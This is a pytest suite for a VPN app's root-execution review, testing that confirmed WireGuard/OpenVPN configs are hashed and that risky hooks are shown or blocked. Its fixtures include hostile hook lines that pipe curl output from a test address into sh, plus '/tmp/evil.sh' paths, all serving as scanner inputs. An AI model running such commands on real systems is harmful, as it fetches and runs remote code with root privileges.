"""Audit tier-2, step S1: the confirmed review is what root runs.

The review the user confirmed travels to the worker; ``execute`` re-reviews and
aborts, with no administrator prompt, on any difference. Nothing here runs
wg-quick, openvpn, sudo or osascript; the runner is always a recorder.
"""

from __future__ import annotations

import hashlib
import os
import stat
import time
import types
from pathlib import Path

import pytest

from services import vpn_connection, vpn_execution, vpn_rootscript

# An absolute wg-quick, so the root command is the same on every machine (S7:
# root never runs a bare name).
FAKE_WG_QUICK = "/opt/test/bin/wg-quick"

PRIVATE_KEY = "cHJpdmF0ZS1rZXktdGhhdC1tdXN0LW5ldmVyLWxlYWsxMjM0NTY3OA=="


class Recorder:
    def __init__(self, ok=True, output="ok"):
        self.ok, self.output, self.scripts = ok, output, []

    def __call__(self, script, prompt, timeout=30):
        self.scripts.append(script)
        return self.ok, self.output


class Probe(dict):
    def __init__(self, up=()):
        self.up = set(up)
        super().__init__(
            wireguard=lambda name: {"up": name in self.up, "device": "utun7" if name in self.up else None},
            openvpn_running=lambda: False,
            route_interface=lambda: None,
        )


@pytest.fixture(autouse=True)
def tools_installed(monkeypatch):
    monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: True)
    monkeypatch.setattr(vpn_execution.openvpn_manager, "openvpn_binary", lambda: "/opt/homebrew/sbin/openvpn")
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: FAKE_WG_QUICK if name == "wg-quick" else real_which(name, *a, **k))


def wg_conf(tmp_path, name="wgnl", interface_extra="", mode=0o600):
    path = tmp_path / f"{name}.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\nAddress = 10.8.0.2/32\n{interface_extra}"
        "[Peer]\nPublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        "Endpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n", encoding="utf-8")
    os.chmod(path, mode)
    return path


def ovpn(tmp_path, body, name="home"):
    path = tmp_path / f"{name}.ovpn"
    path.write_text("client\nremote 203.0.113.7 1194\n" + body, encoding="utf-8")
    return path


def profile_for(path):
    return vpn_connection.profile_from_config(str(path))


def review(action, profile, probe=None):
    return vpn_execution.review_execution(action, profile, probe=probe or Probe(),
                                          killswitch_armed=lambda: False)


def run(action, profile, runner, confirmed, probe=None):
    return vpn_execution.execute(action, profile, confirmed=confirmed, run_as_root=runner,
                                 probe=probe or Probe(), killswitch_armed=lambda: False,
                                 sleep=lambda s: None)


# ── the fingerprint ─────────────────────────────────────────────────────────

def test_the_review_carries_the_sha256_of_the_exact_config_bytes(tmp_path):
    path = wg_conf(tmp_path)
    r = review("connect", profile_for(path))
    assert r.config_sha256 == hashlib.sha256(path.read_bytes()).hexdigest()


def test_an_identical_config_gives_an_identical_fingerprint(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    assert review("connect", p).fingerprint() == review("connect", p).fingerprint()


def test_the_fingerprint_ignores_warnings_but_not_the_things_root_runs(tmp_path):
    import dataclasses
    r = review("connect", profile_for(wg_conf(tmp_path)))
    assert dataclasses.replace(r, warnings=("other",)).fingerprint() == r.fingerprint()
    for change in ({"action": "disconnect"}, {"protocol": "OpenVPN"}, {"target": "/x.conf"},
                   {"command": r.command + " --evil"}, {"interface": "wgx"},
                   {"root_hooks": ("PostUp: id",)}, {"config_sha256": "0" * 64}):
        assert dataclasses.replace(r, **change).fingerprint() != r.fingerprint(), change


def test_a_hook_added_after_confirmation_changes_the_fingerprint(tmp_path):
    path = wg_conf(tmp_path)
    p = profile_for(path)
    before = review("connect", p)
    path.write_text(path.read_text().replace("Address", "PostUp = id\nAddress"))
    assert review("connect", p).fingerprint() != before.fingerprint()


def test_a_changed_comment_changes_the_hash_and_so_the_fingerprint(tmp_path):
    path = wg_conf(tmp_path)
    p = profile_for(path)
    before = review("connect", p)
    path.write_text(path.read_text() + "# touched\n")
    assert review("connect", p).fingerprint() != before.fingerprint()


# ── execute() is gated on the confirmed review ──────────────────────────────

def test_execute_runs_when_the_confirmed_review_still_matches(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    runner = Recorder()
    outcome = run("connect", p, runner, review("connect", p))
    assert outcome.ran is True and len(runner.scripts) == 1


def test_execute_without_a_confirmed_review_fails_closed(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    runner = Recorder()
    outcome = run("connect", p, runner, None)
    assert outcome.ran is False and runner.scripts == []
    assert "no administrator access was requested" in outcome.sections()[0][1]
    assert outcome.status_line.startswith("Refused")


def test_execute_aborts_with_no_prompt_when_the_config_changed_after_confirmation(tmp_path):
    path = wg_conf(tmp_path)
    p = profile_for(path)
    confirmed = review("connect", p)
    path.write_text(path.read_text().replace("Address", "PostUp = /usr/bin/true\nAddress"))
    runner = Recorder()
    outcome = run("connect", p, runner, confirmed)
    assert outcome.ran is False and runner.scripts == []
    assert "changed since you confirmed" in outcome.error
    assert "Review again" in outcome.status_line


def test_execute_aborts_when_the_target_changed(tmp_path):
    first, second = wg_conf(tmp_path, "wgone"), wg_conf(tmp_path, "wgtwo")
    confirmed = review("connect", profile_for(first))
    runner = Recorder()
    outcome = run("connect", profile_for(second), runner, confirmed)
    assert outcome.ran is False and runner.scripts == []


def test_execute_aborts_when_the_confirmed_action_differs(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    runner = Recorder()
    outcome = run("connect", p, runner, review("disconnect", p, Probe(up={"wgnl"})))
    assert outcome.ran is False and runner.scripts == []


def test_a_blocked_review_still_reports_its_own_blockers(tmp_path):
    runner = Recorder()
    outcome = run("connect", {"name": "Ex", "protocol": "WireGuard", "endpoint": "<SERVER_IP>",
                              "interface": "wgjp", "placeholder": True}, runner, None)
    assert outcome.ran is False and "template" in outcome.error.lower()


# ── hooks: full text, disconnect scan ───────────────────────────────────────

def test_disconnect_review_scans_predown_and_postdown(tmp_path):
    """Inverse of the old test_disconnect_review_does_not_rescan_hooks."""
    path = wg_conf(tmp_path, "wgh", interface_extra="PostUp = /opt/hook.sh\n"
                   "PreDown = curl -s http://203.0.113.9/d | sh\nPostDown = id\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgh"}))
    assert r.root_hooks == ("PostUp: /opt/hook.sh",
                            "PreDown: curl -s http://203.0.113.9/d | sh",
                            "PostDown: id")
    assert r.config_sha256 == hashlib.sha256(path.read_bytes()).hexdigest()


def test_a_long_hook_is_kept_whole_in_the_model_and_the_detail(tmp_path):
    command = "curl -s http://203.0.113.9/" + "a" * 500 + " | sh"
    path = wg_conf(tmp_path, interface_extra=f"PostUp = {command}\n")
    r = review("connect", profile_for(path))
    assert r.root_hooks == (f"PostUp: {command}",)
    assert command not in r.confirmation_text()          # the dialog body is shortened...
    assert "more characters" in r.confirmation_text()    # ...and says so
    assert command in r.confirmation_detail()            # ...but the detail has all of it
    assert any(command in body for _, body, _ in r.sections())


def test_a_short_hook_is_shown_in_full_in_the_confirmation(tmp_path):
    path = wg_conf(tmp_path, interface_extra="PostUp = echo hi\n")
    r = review("connect", profile_for(path))
    assert "echo hi" in r.confirmation_text()
    assert "more characters" not in r.confirmation_text()


def test_a_hook_line_over_4000_characters_is_a_blocker(tmp_path):
    path = wg_conf(tmp_path, interface_extra="PostUp = echo " + "x" * 4000 + "\n")
    r = review("connect", profile_for(path))
    assert not r.allowed and any("4000" in b for b in r.blockers)


# ── user-writable hook executables (D1) ─────────────────────────────────────

def _fake_stat(table):
    def stat_(path, *a, **k):
        entry = table.get(str(path))
        if entry is None:
            raise FileNotFoundError(path)
        uid, mode = entry
        return types.SimpleNamespace(st_uid=uid, st_mode=mode)
    return stat_


ROOT_DIR = stat.S_IFDIR | 0o755
ROOT_FILE = stat.S_IFREG | 0o755


def test_a_hook_script_owned_by_the_user_is_a_blocker(tmp_path):
    script = tmp_path / "hook.sh"
    script.write_text("#!/bin/sh\n")
    path = wg_conf(tmp_path, interface_extra=f"PostUp = {script} up\n")
    r = review("connect", profile_for(path))
    assert not r.allowed
    assert any(str(script) in b and "administrator" in b for b in r.blockers)


def test_a_group_writable_hook_script_is_a_blocker(monkeypatch, tmp_path):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/local/sbin/hook.sh": (0, stat.S_IFREG | 0o775),
        "/usr/local/sbin": (0, ROOT_DIR), "/usr/local": (0, ROOT_DIR),
        "/usr": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = /usr/local/sbin/hook.sh\n")
    assert not review("connect", profile_for(path)).allowed


def test_a_writable_parent_directory_is_a_blocker(monkeypatch, tmp_path):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/opt/tools/hook.sh": (0, ROOT_FILE),
        "/opt/tools": (501, stat.S_IFDIR | 0o755), "/opt": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = /opt/tools/hook.sh\n")
    assert not review("connect", profile_for(path)).allowed


def test_a_root_owned_hook_script_is_allowed(monkeypatch, tmp_path):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/local/sbin/hook.sh": (0, ROOT_FILE),
        "/usr/local/sbin": (0, ROOT_DIR), "/usr/local": (0, ROOT_DIR),
        "/usr": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = /usr/local/sbin/hook.sh -v --up\n")
    r = review("connect", profile_for(path))
    assert r.allowed and r.root_hooks == ("PostUp: /usr/local/sbin/hook.sh -v --up",)


def test_a_bare_hook_command_outside_the_system_folders_is_refused(tmp_path, monkeypatch):
    """Second review of #32 (P1-2): a bare name wg-quick would find only in its own
    (user-writable) folder, or not yet at all, could be created after the review."""
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: None)
    path = wg_conf(tmp_path, interface_extra="PostUp = iptables -A FORWARD -j ACCEPT\n")
    r = review("connect", profile_for(path))
    assert _blocked(r, "'iptables', which is not a program in /usr/bin, /bin, /usr/sbin, /sbin")


def test_an_openvpn_up_script_in_a_user_directory_is_a_blocker(tmp_path):
    script = tmp_path / "up.sh"
    script.write_text("#!/bin/sh\n")
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup {script}\n")))
    assert not r.allowed and any(str(script) in b for b in r.blockers)


# ── OpenVPN blockers and warnings (D3, D4) ──────────────────────────────────

@pytest.mark.parametrize("line", [
    "config other.ovpn", "management 127.0.0.1 7505", "management-client", "log /tmp/x",
    "log-append /tmp/x", "writepid /tmp/pid", "status /tmp/s", "tmp-dir /tmp", "cd /tmp",
    "chroot /tmp", "setenv FOO bar", "--config other.ovpn", "CONFIG other.ovpn",
])
def test_openvpn_directives_that_hide_or_redirect_are_blockers(tmp_path, line):
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert not r.allowed
    assert any(line.split()[0].lstrip("-").lower() in b.lower() for b in r.blockers)


def test_setenv_safe_is_not_setenv(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "setenv-safe FOO bar\n")))
    assert r.allowed


def test_unknown_openvpn_directives_only_warn_in_one_line(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "frobnicate 1\nwidget on\ncipher AES-256-GCM\n")))
    assert r.allowed
    unknown = [w for w in r.warnings if "not on the reviewed list" in w]
    assert len(unknown) == 1 and "frobnicate" in unknown[0] and "widget" in unknown[0]
    assert "cipher" not in unknown[0]


def test_a_plain_openvpn_profile_has_no_unknown_warning(tmp_path):
    body = ("dev tun\nproto udp\nnobind\npersist-key\nremote-cert-tls server\n"
            "<ca>\nMIIBogus\nconfig inside block is data\n</ca>\n<key>\nabc\n</key>\n")
    r = review("connect", profile_for(ovpn(tmp_path, body)))
    assert r.allowed and not any("reviewed list" in w for w in r.warnings)


def test_openvpn_connect_review_hashes_the_config(tmp_path):
    path = ovpn(tmp_path, "dev tun\n")
    assert review("connect", profile_for(path)).config_sha256 == hashlib.sha256(path.read_bytes()).hexdigest()


# ── reading the config once ─────────────────────────────────────────────────

def test_an_oversized_config_is_a_blocker(tmp_path):
    path = wg_conf(tmp_path)
    path.write_text(path.read_text() + "# " + "x" * (256 * 1024) + "\n")
    r = review("connect", profile_for(path))
    assert not r.allowed and any("256 KiB" in b for b in r.blockers)


def test_a_symlinked_config_is_a_warning(tmp_path):
    real = wg_conf(tmp_path, "wgreal")
    link = tmp_path / "wglink.conf"
    link.symlink_to(real)
    r = review("connect", profile_for(link))
    assert any("symbolic link" in w for w in r.warnings)


# ── the worker and the panel hand the confirmed review through ──────────────

def test_the_worker_passes_the_confirmed_review_to_execute(monkeypatch):
    from ui import workers
    seen = {}

    def fake_execute(action, profile, **kwargs):
        seen.update(action=action, kwargs=kwargs)
        return types.SimpleNamespace(as_result=lambda: {"success": True})

    monkeypatch.setattr(vpn_execution, "execute", fake_execute)
    sentinel = object()
    worker = workers.VpnConnectionWorker("connect", {"name": "x"}, sentinel)
    got = []
    worker.finished_signal.connect(got.append)
    worker.run()
    assert seen["kwargs"]["confirmed"] is sentinel and got == [{"success": True}]


def test_the_worker_defaults_to_no_confirmed_review(monkeypatch):
    from ui import workers
    assert workers.VpnConnectionWorker("connect", {})._confirmed is None


# ═════════════════════════════════════════════════════════════════════════════
# Round 2: independent review findings
# ═════════════════════════════════════════════════════════════════════════════

def _blocked(r, needle):
    return (not r.allowed) and any(needle in b for b in r.blockers)


# ── the OpenVPN scanner reads lines the way OpenVPN does ────────────────────

@pytest.mark.parametrize("line", [
    '"up" /x/y.sh', "u\\p /x/y.sh", "'plugin' /x/lib.so", '"config" other.ovpn',
    "lo\\g /tmp/x", '"script-security" 2', "--\"up\" /x", "'up'x /x",
])
def test_quoted_or_escaped_directive_names_are_blockers(tmp_path, line):
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert _blocked(r, "quote or backslash")


def test_an_unbalanced_quote_in_a_value_is_a_blocker(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, 'remote-cert-tls "server\n')))
    assert _blocked(r, "unbalanced")


def test_a_close_tag_with_trailing_text_is_an_ambiguous_block(tmp_path):
    body = "<ca>\nMIIBogus\n</ca>x\nup /tmp/evil.sh\n</ca>\n"
    r = review("connect", profile_for(ovpn(tmp_path, body)))
    assert _blocked(r, "ambiguous inline block")


def test_an_unterminated_inline_block_is_a_blocker(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "<ca>\nMIIBogus\nup /tmp/evil.sh\n")))
    assert _blocked(r, "ambiguous inline block")


def test_an_indented_close_tag_is_ambiguous(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "<ca>\nabc\n  </ca>\nup /x\n</ca>\n")))
    assert _blocked(r, "ambiguous inline block")


def test_a_properly_closed_block_with_crlf_is_fine(tmp_path):
    path = tmp_path / "crlf.ovpn"
    path.write_bytes(b"client\r\nremote 203.0.113.7 1194\r\n<ca>\r\nabc\r\n</ca>\r\nup /usr/bin/true\r\n")
    r = review("connect", profile_for(path))
    assert r.allowed
    assert r.root_hooks == ("up: /usr/bin/true",)        # no stray \r in the value


def test_crlf_does_not_hide_a_blocker(tmp_path):
    path = tmp_path / "crlf2.ovpn"
    path.write_bytes(b"client\r\nremote 203.0.113.7 1194\r\nconfig other.ovpn\r\n")
    assert _blocked(review("connect", profile_for(path)), "config")


def test_unicode_line_separators_do_not_split_lines(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "dev tun up /tmp/x\n")))
    assert r.root_hooks == ()          # OpenVPN sees one line; so does the scanner


def test_a_comment_starting_a_token_ends_the_line(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "verb 3 # config other\n")))
    assert r.allowed


# ── every path word of a hook command ───────────────────────────────────────

def _user_script(tmp_path):
    script = tmp_path / "evil.sh"
    script.write_text("#!/bin/sh\n")
    return script


@pytest.mark.parametrize("template", [
    "/bin/sh {s}", "sh {s}", "bash -c {s}", "/usr/bin/env FOO=1 {s}", "env {s}",
    "echo ok && {s}", "true; {s} up", "python3 {s}", "/usr/bin/perl {s}", "osascript {s}",
    "nohup {s}", "FOO=1 {s}", "'{s}'",
])
def test_a_user_writable_program_anywhere_in_a_wireguard_hook_is_a_blocker(tmp_path, template):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, interface_extra="PostUp = " + template.format(s=script) + "\n")
    assert _blocked(review("connect", profile_for(path)), str(script))


def test_a_tilde_path_in_an_interpreter_hook_is_a_blocker(tmp_path):
    path = wg_conf(tmp_path, interface_extra="PostUp = sh ~/hook.sh\n")
    assert _blocked(review("connect", profile_for(path)), "~/hook.sh")


def test_a_user_writable_data_argument_of_a_root_program_is_only_a_warning(monkeypatch, tmp_path):
    data = tmp_path / "list.txt"
    data.write_text("x")
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/sbin/pfctl": (0, ROOT_FILE), "/sbin": (0, ROOT_DIR),
        "/": (0, ROOT_DIR), str(data): (501, stat.S_IFREG | 0o644),
        str(tmp_path): (501, stat.S_IFDIR | 0o755)}))
    # pfctl is on the allowlist of network programs, so its arguments are data.
    path = wg_conf(tmp_path, interface_extra=f"PostUp = /sbin/pfctl -f {data}\n")
    r = review("connect", profile_for(path))
    assert r.allowed and any(str(data) in w for w in r.warnings)


def test_a_user_writable_program_after_an_interpreter_in_openvpn_is_a_blocker(tmp_path):
    script = _user_script(tmp_path)
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup /bin/sh {script}\n")))
    assert _blocked(r, str(script))


# ── interface-only WireGuard profiles are hashed and scanned too ────────────

IFACE_ONLY = {"name": "VPS", "protocol": "WireGuard", "endpoint": "203.0.113.7", "interface": "wgx"}


def test_an_interface_only_profile_resolves_hashes_and_scans_its_conf(tmp_path, monkeypatch):
    conf = wg_conf(tmp_path, "wgx", interface_extra="PostUp = echo hi\n")
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", ("/nonexistent-a", str(tmp_path)))
    r = review("connect", IFACE_ONLY)
    assert r.config_sha256 == hashlib.sha256(conf.read_bytes()).hexdigest()
    assert r.root_hooks == ("PostUp: echo hi",)


def test_an_interface_only_conf_with_a_user_script_hook_is_blocked(tmp_path, monkeypatch):
    script = _user_script(tmp_path)
    wg_conf(tmp_path, "wgx", interface_extra=f"PostUp = {script}\n")
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    assert _blocked(review("connect", IFACE_ONLY), str(script))


def test_an_interface_only_profile_without_a_conf_says_import_it(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    assert _blocked(review("connect", IFACE_ONLY), "import the .conf")


def test_an_unreadable_interface_only_conf_blocks_a_connect(tmp_path, monkeypatch):
    conf = wg_conf(tmp_path, "wgx")
    os.chmod(conf, 0)
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    try:
        if os.access(conf, os.R_OK):
            pytest.skip("running as a user that can read mode 000 files")
        assert not review("connect", IFACE_ONLY).allowed
    finally:
        os.chmod(conf, 0o600)


@pytest.mark.parametrize("line", ["SaveConfig = true", "saveconfig=TRUE", "SAVECONFIG = True",
                                  "SaveConfig = true # keep my peers", "SaveConfig=true#x", "SaveConfig = true\t # x"])
def test_saveconfig_true_is_a_blocker(tmp_path, line):
    path = wg_conf(tmp_path, interface_extra=line + "\n")
    assert _blocked(review("connect", profile_for(path)), "SaveConfig")


def test_saveconfig_false_with_a_comment_is_fine(tmp_path):
    path = wg_conf(tmp_path, interface_extra="SaveConfig = false # true would rewrite it\n")
    assert review("connect", profile_for(path)).allowed


def test_saveconfig_false_is_fine(tmp_path):
    assert review("connect", profile_for(wg_conf(tmp_path, interface_extra="SaveConfig = false\n"))).allowed


# ── Disconnect never strands the user ───────────────────────────────────────

def test_a_user_writable_postdown_on_disconnect_is_a_risk_not_a_blocker(tmp_path):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {script}\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgd"}))
    assert r.allowed and r.blockers == ()
    assert any(str(script) in item for item in r.risks)
    assert r.needs_second_confirmation is True


def test_the_same_hook_still_blocks_a_connect(tmp_path):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {script}\n")
    assert not review("connect", profile_for(path)).allowed


def test_an_unreadable_config_on_disconnect_is_a_risk(tmp_path):
    path = wg_conf(tmp_path, "wgu")
    os.chmod(path, 0)
    try:
        if os.access(path, os.R_OK):
            pytest.skip("running as a user that can read mode 000 files")
        r = review("disconnect", profile_for(path), Probe(up={"wgu"}))
        assert r.allowed and r.risks
    finally:
        os.chmod(path, 0o600)


def test_an_oversized_config_on_disconnect_is_a_risk(tmp_path):
    path = wg_conf(tmp_path, "wgo")
    path.write_text(path.read_text() + "# " + "x" * (256 * 1024) + "\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgo"}))
    assert r.allowed and r.risks


def test_risks_are_part_of_the_fingerprint(tmp_path):
    import dataclasses
    p = profile_for(wg_conf(tmp_path, "wgd"))
    r = review("connect", p)
    assert dataclasses.replace(r, risks=("x",)).fingerprint() != r.fingerprint()


def test_disconnect_with_the_kill_switch_armed_runs_when_the_confirmed_review_matches(tmp_path):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {script}\n")
    p = profile_for(path)
    probe = Probe(up={"wgd"})
    armed = vpn_execution.review_execution("disconnect", p, probe=probe, killswitch_armed=lambda: True)
    assert armed.allowed and armed.risks
    runner = Recorder()
    outcome = vpn_execution.execute("disconnect", p, confirmed=armed, run_as_root=runner,
                                    probe=probe, killswitch_armed=lambda: True, sleep=lambda s: None)
    assert outcome.ran is True and len(runner.scripts) == 1


def test_disconnect_still_fails_closed_on_a_fingerprint_mismatch(tmp_path):
    script = _user_script(tmp_path)
    path = wg_conf(tmp_path, "wgd", interface_extra=f"PostDown = {script}\n")
    p = profile_for(path)
    probe = Probe(up={"wgd"})
    confirmed = review("disconnect", p, probe)
    path.write_text(path.read_text() + "PostDown = id\n")
    runner = Recorder()
    outcome = run("disconnect", p, runner, confirmed, probe)
    assert outcome.ran is False and runner.scripts == []


# ── honest hash wording and the dead unguarded wg-quick path ────────────────

def test_the_hash_line_says_when_it_was_checked(tmp_path):
    # WireGuard (S7): root re-checks the hash on its own copy, which is what runs.
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = echo hi\n")))
    wording = "checked again by root on its own copy, which is what runs"
    assert wording in r.confirmation_detail()
    assert any(wording in body for _, body, _ in r.sections())
    # OpenVPN (S8b): the same, since root copies and checks the .ovpn too.
    ovpn = vpn_execution.ExecutionReview("connect", "OpenVPN", "x", "/c.ovpn", "", "cmd",
                                         config_sha256="a" * 64)
    assert wording in ovpn._hash_line()
    assert "password prompt" not in ovpn._hash_line()


def test_the_module_and_execute_docstrings_do_not_overclaim():
    for doc in (vpn_execution.__doc__, vpn_execution.execute.__doc__):
        assert "not when root reads" not in doc   # S8b closed it for OpenVPN
        assert "S7" in doc and "S8b" in doc and "copy" in doc
        assert "absolute path" in doc             # residual D2 stays named


def test_the_unguarded_wireguard_manager_wg_quick_helpers_refuse():
    from agents.vpn_agent.services import wireguard_manager
    with pytest.raises(RuntimeError, match="vpn_execution"):
        wireguard_manager.connect("wg0")
    with pytest.raises(RuntimeError, match="vpn_execution"):
        wireguard_manager.disconnect("wg0")


def test_the_tilde_rule_refuses_a_home_program_whatever_the_filesystem_says(monkeypatch):
    # Even if every path looked root-owned and read-only, ~ is a user's home.
    monkeypatch.setattr(vpn_execution, "_stat", lambda p, *a, **k: types.SimpleNamespace(
        st_uid=0, st_mode=stat.S_IFREG | 0o755))
    from pathlib import Path
    reason = vpn_execution._unsafe_executable_reason(Path("~/hook.sh"))
    assert reason and "home" in reason


def test_the_confirmation_dialog_lists_the_risks_of_a_disconnect(tmp_path):
    path = wg_conf(tmp_path, "wgo")
    path.write_text(path.read_text() + "# " + "x" * (256 * 1024) + "\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgo"}))
    assert r.risks
    body = r.confirmation_text()
    assert "Not reviewable" in body
    for item in r.risks:
        assert f"• {item}" in body
    assert any("Risks" in title and r.risks[0] in text for title, text, _ in r.sections())


# ── Codex review of PR #3: the reviewed file is the file root runs ─────────

def test_an_interface_only_connect_runs_the_reviewed_file_not_a_bare_name(tmp_path, monkeypatch):
    conf = wg_conf(tmp_path, "wgx")
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    r = review("connect", IFACE_ONLY)
    assert r.target == str(conf) and str(conf) in r.command
    runner = Recorder()
    outcome = vpn_execution.execute("connect", IFACE_ONLY, confirmed=r, run_as_root=runner,
                                    probe=Probe(), killswitch_armed=lambda: False,
                                    sleep=lambda s: None)
    assert outcome.ran and len(runner.scripts) == 1
    assert str(conf) in runner.scripts[0], "wg-quick must be given the hashed file"
    assert "wgx'" not in runner.scripts[0].replace(str(conf), "")


def test_an_interface_only_disconnect_also_names_the_reviewed_file(tmp_path, monkeypatch):
    conf = wg_conf(tmp_path, "wgx")
    monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(tmp_path),))
    r = review("disconnect", IFACE_ONLY, Probe(up={"wgx"}))
    runner = Recorder()
    vpn_execution.execute("disconnect", IFACE_ONLY, confirmed=r, run_as_root=runner,
                          probe=Probe(up={"wgx"}), killswitch_armed=lambda: False,
                          sleep=lambda s: None)
    assert runner.scripts and str(conf) in runner.scripts[0]


def test_a_bare_hook_command_in_a_user_writable_path_directory_is_a_blocker(tmp_path, monkeypatch):
    helper = tmp_path / "helper"
    helper.write_text("#!/bin/sh\n")
    helper.chmod(0o755)
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: str(tmp_path / "wg-quick") if name == "wg-quick" else None)
    path = wg_conf(tmp_path, interface_extra="PostUp = helper --up\n")
    r = review("connect", profile_for(path))
    assert _blocked(r, "'helper', which is not a program in")
    assert any("write plain commands with full paths" in b for b in r.blockers)


def test_a_bare_hook_command_that_resolves_to_a_root_owned_program_is_accepted(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/id")
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/bin/id": (0, ROOT_FILE), "/usr/bin": (0, ROOT_DIR), "/usr": (0, ROOT_DIR),
        "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = id -u\n")
    assert review("connect", profile_for(path)).allowed


def test_a_bare_hook_command_that_resolves_to_a_user_writable_program_is_refused(
        tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: "/usr/bin/id")
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/bin/id": (501, ROOT_FILE), "/usr/bin": (0, ROOT_DIR), "/usr": (0, ROOT_DIR),
        "/": (0, ROOT_DIR)}))
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra="PostUp = id\n")))
    assert _blocked(r, "resolves to /usr/bin/id")


def test_a_bare_hook_command_that_is_not_installed_is_refused(tmp_path, monkeypatch):
    """P1-2: wg-quick's PATH ends in its own Homebrew folder, so a user can create
    the program after the review."""
    monkeypatch.setattr(vpn_execution, "_which_privileged", lambda name: None)
    path = wg_conf(tmp_path, interface_extra="PostUp = nosuchcmd-zz9\n")
    assert _blocked(review("connect", profile_for(path)), "'nosuchcmd-zz9'")


def test_a_link_into_a_user_writable_folder_is_unsafe(tmp_path, monkeypatch):
    """A root-owned program reached through a link is judged by where the link
    leads: its real folder is writable, so a normal user could replace it."""
    safe, loose = tmp_path / "safe", tmp_path / "loose"
    safe.mkdir()
    loose.mkdir()
    target = loose / "tool"
    target.write_text("#!/bin/sh\n")
    link = safe / "tool"
    link.symlink_to(target)

    def stat_(path, *a, **k):
        mode = (stat.S_IFDIR | 0o777) if str(path) == str(loose) else ROOT_DIR
        return types.SimpleNamespace(st_uid=0, st_mode=mode)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)
    reason = vpn_execution._unsafe_executable_reason(link)
    assert reason is not None and str(loose) in reason
    assert vpn_execution._unsafe_executable_reason(safe / "missing") is None


def test_a_link_chain_through_a_user_writable_folder_is_unsafe(tmp_path, monkeypatch):
    """safe/tool -> loose/hop -> safe2/tool: the middle link sits in a folder a user
    can write, so it could be redirected after review."""
    safe, loose, safe2 = tmp_path / "safe", tmp_path / "loose", tmp_path / "safe2"
    for d in (safe, loose, safe2):
        d.mkdir()
    (safe2 / "tool").write_text("#!/bin/sh\n")
    (loose / "hop").symlink_to(safe2 / "tool")
    (safe / "tool").symlink_to(loose / "hop")

    def stat_(path, *a, **k):
        mode = (stat.S_IFDIR | 0o777) if str(path) == str(loose) else ROOT_DIR
        return types.SimpleNamespace(st_uid=0, st_mode=mode)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)
    reason = vpn_execution._unsafe_executable_reason(safe / "tool")
    assert reason is not None and str(loose) in reason


# ── review of #30: lines wg-quick reads differently, link walks, NUL bytes ──

@pytest.mark.parametrize("line, runs", [
    ("PostUp # = /tmp/evil.sh arg", "/tmp/evil.sh arg"),     # key cut at "#", value after "="
    ("PostUp#=/tmp/evil.sh", "/tmp/evil.sh"),
    ("postdown # note = /tmp/evil.sh", "/tmp/evil.sh"),
    ("PreUp", "PreUp"),                                       # no "=": the line itself runs
])
def test_a_hook_wg_quick_reads_past_a_comment_is_shown_and_refused(tmp_path, line, runs):
    r = review("connect", profile_for(wg_conf(tmp_path, interface_extra=line + "\n")))
